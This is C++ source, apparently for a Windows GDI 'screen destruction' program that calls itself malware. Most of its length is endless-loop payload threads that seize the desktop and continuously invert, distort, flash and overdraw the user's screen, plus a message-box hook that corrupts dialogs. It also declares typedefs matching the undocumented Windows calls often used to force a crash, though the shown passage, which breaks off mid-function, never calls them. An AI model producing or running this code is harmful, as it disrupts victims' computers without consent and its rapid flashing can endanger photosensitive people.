﻿// Blade Archer.cpp : 定义应用程序的入口点。
//
//Blade Archer.exe:malware
//insprired by Antimony.exe&radience.exe by camellia-y7x

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define EE 2.7182818284590452353602874713526624977572
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define BladeArcherRGB (RGB(153, 172, 68))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(BladeArcherRGB);
			SelectObject(hcdc, hBrush);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); 
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
VOID WINAPI RotatePoints_Hexagon(POINT* points, int count, POINT center, float angle)
{
	float cosVal = cos(angle);
	float sinVal = sin(angle);
	for (int i = 0; i < count; i++)
	{
		int translatedX = points[i].x - center.x;
		int translatedY = points[i].y - center.y;
		points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
		points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
	}
}
int DrawIconFunction(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	return 1;
}
HRGN CreateRgn(int x, int y, int size) {
	POINT points[9];
	double angle = 2 * PI / 9;
	for (int i = 0; i < 7; i++) {
		points[i].x = x + (int)(size * cos(i * angle));
		points[i].y = y + (int)(size * sin(i * angle));
	}
	points[7] = points[0];
	return CreatePolygonRgn(points, 7, WINDING);
}
VOID WINAPI BigPolygonFunction(int x, int y, int w, int h) {
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateRgn(x, y, w / 2);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x - w / 2, y - h / 2, w, h, hdc, x - w / 2, y - h / 2, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(0, hdc);
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((((t ^ 7 >> t % 78 + 8 ^ t * (91 + t & 31) >> t % (13 - (t >> 13) % 7 * 8) - 91))));//Kelp Spreader.exe is skidded!
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload1_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int y = 0; y < h; y += 35) {
			for (int x = 0; x < w; x += 35) {
				if (rand() % 4 != 0) { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 15, 15, SRCINVERT); }
				else { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 15, 15, NOTSRCERASE); }
			}
		}
		for (int i = 0; i < w; i++) { StretchBlt(hdcCopy, i, -2 + (rand() % 5), 1, h, hdcCopy, i, 0, 1, h, NOTSRCCOPY); }
		for (int y = 0; y < h; y++) {
			int bei = rand() % 2;
			if (bei == 1) { StretchBlt(hdcCopy, 3, y, w, 1, hdcCopy, 0, y, w, 1, NOTSRCCOPY); }
			else { StretchBlt(hdcCopy, -3, y, w, 1, hdcCopy, 0, y, w, 1, NOTSRCCOPY); }
		}
		for (int x = 0; x < w; x++) {
			int beiCopy = rand() % 2;
			if (beiCopy == 1) { StretchBlt(hdcCopy, x, 2, 1, h, hdcCopy, x, 0, 1, h, SRCPAINT); }
			else { StretchBlt(hdcCopy, x, -2, 1, h, hdcCopy, x, 0, 1, h, SRCAND); }
		}
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCERASE);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload1_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1, incrementation = 10, x = 10, y = 10, i = 0;
	float rotationAngle = 0.0f, rotationSpeed = 0.02f;
	while (true) {
		hdc = GetDC(0);
		x += incrementation * sx + sin(i) * 90;
		y += incrementation * sy + cos(i) * 90;
		int cx = x + 50, cy = y + 50, rad = 50, top_x = 0 + x, top_y = 0 + y, bottom_x = 100 + x, bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		POINT NonagonPoints[9];
		for (int i = 0; i < 9; ++i) {
			double angle = 2.0 * PI * i / 9;
			NonagonPoints[i].x = cx + static_cast<int>(rad * cos(angle));
			NonagonPoints[i].y = cy + static_cast<int>(rad * sin(angle));
		}
		POINT center =
		{
			(top_x + bottom_x) / 2, (top_y + bottom_y) / 2
		};
		RotatePoints_Hexagon(NonagonPoints, 6, center, rotationAngle);
		Polygon(hdc, NonagonPoints, 6);
		if (cy >= GetSystemMetrics(1)) { sy = -1; }
		if (cx >= GetSystemMetrics(0)) { sx = -1; }
		if (cy <= 0) { sy = 2; }
		if (cx <= 0) { sx = 2; }
		rotationAngle += rotationSpeed;
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
		i++;
	}
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)//credits ti camellia-y7x for this payload, but i modified it
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), size = 200, xxx = 0;;
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb >>= ((i + xxx) & i) << (w + (i / h) | ~i) & (w + h); }
		for (int i = 0; i < 5; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			HBRUSH hBrush = CreateSolidBrush(BladeArcherRGB);
			SelectObject(hdcCopy, hBrush);
			BitBlt(hdcCopy, x, y, size, size, hdcCopy, x + rand() % 20 - 9, y + rand() % 20 - 9, PATCOPY);
			DeleteObject(hBrush);
		}
		for (int i = 0; i < 5; i++) {
			int y = (h / 2) - rand() % h;
			HBRUSH hBrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hBrush);
			BitBlt(hdcCopy, 0, y, w, h, hdcCopy, 0, y, PATINVERT);
			DeleteObject(hBrush);
		}
		for (int y = 0; y < h; y += 5) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 5, hdcCopy, 0, y, w, 5, NOTSRCERASE); }
		BitBlt(hdcCopy, rand() % 10, rand() % 10, w, h, hdcCopy, rand() % 10, rand() % 10, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		for (int i = 0; i < 2; i++) { AlphaBlend(hdc, -20 + rand() % 41, -20 + rand() % 41, w, h, hdcCopy, 0, 0, w, h, blur); }
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload2_num2(LPVOID lpParam) {
	HICON hIcon;
	int size = 32 + rand() % 118, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	srand(time(NULL));
	while (true)
	{
		hIcon = LoadIcon(0, lpIconNames[rand() % 6]);
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
		hIcon = LoadCursor(0, lpCursorNames[rand() % 16]); 
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
		hIcon = LoadIcon(0, MAKEINTRESOURCE(107)); 
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
	}
}
DWORD WINAPI Payload3_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (x + int(asin(tanf(0.0019f * x + i * 0.0009f) * 320))) % w;
				int fxCopy = (y + int(acot(cosf(0.0009f * y + i * 0.0019f) * 320))) % h;
				double fxCombined = (fx + fxCopy) ^ (fx - fxCopy);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(-fxCombined / 1700.f + y / h * .2f, 1.f);
				hslcolor.h = (float)fmod(hslcolor.h + fxCombined / 15000.0 + 0.09, 1.0);
				hslcolor.s += fmod(hslcolor.s + (x % 20) / 250.0f, 1.0f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.5033f) { hslcolor.l += 0.114514f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload3_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w, y = rand() % h, dx = (rand() % 3) - 1, dy = (rand() % 3) - 1;
			BitBlt(hdcCopy, x + dx, y + dy, w - x, h - y, hdcCopy, x, y, SRCCOPY);
		}
		if (rand() % 4 == 0) { BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCAND); }
		else if (rand() % 4 == 1) { BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCPAINT); }
		else if (rand() % 4 == 3) { BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCINVERT); }
		else { BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE); }
		ReleaseDC(0, hdc);
	}
	SelectObject(hdcCopy, bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam)//modified from diagpkg.exe
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), ii = 0;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].r *= ~((x * x) >> (y * y) * ii) / (i + 1);
			rgbScreen[i].g ^= ((x * x) ^ (y * y) * ~ii) / (i + 1);
			rgbScreen[i].b += ((x * x) & (y * y) * ii) % (i + 1);
		}
		ii++;
		for (int x = 0; x <= w; x++) { BitBlt(hdcCopy, x, 10 * ((rand() % 5) - 3), 1, h, hdcCopy, x, 0, SRCCOPY); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload4_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL);
	while (true)
	{
		hdc = GetDC(0);
		int rw = rand() % w, rh = rand() % h, tw = 0 + rw, th = 0 + rh, bw = 123 + rw, bh = 123 + rh, z = (rand() % 3);
		HBRUSH hbrush = CreateHatchBrush(rand() % 7, RndRGB);
		SelectObject(hdc, hbrush);
		for (int MazeLarperNoSkidNoAI = 0; MazeLarperNoSkidNoAI < 4; MazeLarperNoSkidNoAI++) {
			if (z == 0) { Ellipse(hdc, tw, th, bw, bh); }
			else if (z == 1) { Rectangle(hdc, tw, th, bw, bh); }
			else if (z == 2) {
				POINT vpt[3] = { {0, 0}, {0, 0}, {0, 0} };
				vpt[0] = { tw, bh };
				vpt[1] = { bw, bh };
				vpt[2] = { (tw + bw) / 2, th };
				Polygon(hdc, vpt, 3);
			}
		}
		Sleep(25);
		ReleaseDC(0, hdc);
		DeleteObject(hbrush);
	}
	return 0;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				double fractalX = abs(2.55f / w);
				double fractalY = abs(1.90f / h);
				double cx = x * fractalX - 2.1f;
				double cy = y * fractalY - 0.9f;
				double zx = 0;
				double zy = 0;
				int fx = 0;
				while (((zx * zx) + (zy * zy)) < 10 && fx < 60)
				{
					double fczx = zx * zx - zy * zy + cx;
					double fczy = 4 * zx * zy + cy;
					zx = fczx;
					zy = fczy;
					fx++;
				}
				data[y * w + x].rgb += COLORHSV((w + h) - fx * 2);
			}
		}
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0, size = 333;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = (i * i * 2) >> w, y = (i & i * 2) | w;
			rgbScreen[i].rgb ^= ((xxx >> x * y) | (xxx ^ i & w + h) * i);
		}
		for (int i = 0; i < 5; i++) {
			int luckynum = 1 + rand() % 25, rop = SRCCOPY;
			if (luckynum == 3) { rop = SRCAND; }
			else if (luckynum == 5) { rop = SRCPAINT; }
			else if (luckynum == 10) { rop = SRCINVERT; }
			else if (luckynum == 15) { rop = PATCOPY; }
			else if (luckynum == 17) { rop = SRCBRUSH; }
			else if (luckynum == 18) { rop = RGBBRUSH; }
			else if (luckynum == 20) { rop = NOTSRCCOPY; }
			else if (luckynum == 25) { rop = NOTSRCERASE; }
			else { rop = SRCCOPY; }
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hbrush);
			BitBlt(hdcCopy, x, y, size, size, hdcCopy, x + rand() % 20 - 9, y + rand() % 20 - 9, rop);
			DeleteObject(hbrush);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
		xxx++;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload7_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RECT rect;
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT pt1[3];
		pt1[0].x = rect.left - 11;
		pt1[0].y = rect.top + 45;
		pt1[1].x = rect.right + rand() % 14;
		pt1[1].y = rect.top - 19;
		pt1[2].x = rect.left - 198;
		pt1[2].y = rect.bottom + 10;
